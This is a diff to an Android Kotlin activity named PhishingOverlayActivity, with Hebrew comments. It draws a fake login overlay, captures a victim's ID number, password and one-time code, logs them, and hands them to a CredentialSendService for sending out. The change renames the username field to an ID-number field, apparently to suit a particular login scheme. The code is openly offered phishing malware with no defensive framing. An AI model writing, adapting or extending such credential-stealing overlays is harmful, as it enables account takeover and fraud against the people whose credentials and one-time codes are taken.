@@ -27,29 +27,29 @@ class PhishingOverlayActivity : Activity() {
         // ממשק הפישינג שלך
         setContentView(R.layout.phishing_login_overlay)
 
-        val username = findViewById<EditText>(R.id.username_field)
-        val password = findViewById<EditText>(R.id.password_field)
-        val otp = findViewById<EditText>(R.id.otp_field)
+        // עדכון לפי ה-IDים החדשים בלייאאוט
+        val idField = findViewById<EditText>(R.id.id_field)
+        val passwordField = findViewById<EditText>(R.id.password_field)
+        val codeField = findViewById<EditText>(R.id.code_field)
         val loginButton = findViewById<Button>(R.id.login_button)
 
         loginButton.setOnClickListener {
-            val user = username.text.toString()
-            val pass = password.text.toString()
-            val code = otp.text.toString()
+            val idNumber = idField.text.toString()
+            val pass = passwordField.text.toString()
+            val code = codeField.text.toString()
 
-            Log.d("PhishingOverlay", "user=$user pass=$pass otp=$code")
+            Log.d("PhishingOverlay", "id=$idNumber pass=$pass otp=$code")
 
-            // שליחה לשרת או קוד קיים:
             val intent = Intent(this, CredentialSendService::class.java).apply {
-                putExtra("username", user)
+                putExtra("id", idNumber)       // ← כאן שינינו מ-"username" ל-"id"
                 putExtra("password", pass)
-                putExtra("otp", code)
+                putExtra("code", code)
             }
             startService(intent)
 
             finish()
         }
 
-        username.requestFocus()
+        idField.requestFocus()
     }
 }
